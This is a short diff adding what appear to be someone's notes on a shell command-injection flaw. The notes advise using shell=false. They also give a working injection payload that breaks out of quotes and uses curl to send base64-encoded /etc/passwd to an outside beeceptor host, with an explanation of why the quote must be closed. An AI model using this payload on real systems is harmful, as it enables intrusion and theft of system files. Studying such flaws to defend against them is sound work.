@@ -1,0 +1,5 @@
+the problem is the dev takes the input and write it directly in the shell without any filltration of validation
+allways make the shell=false
+
+'; curl "https://null13372.free.beeceptor.com/data?user=$(cat /etc/passwd | base64 | tr -d '\n')" ;'
+you must close '' because anything between ' ' shell treat it as string and won't excute it 
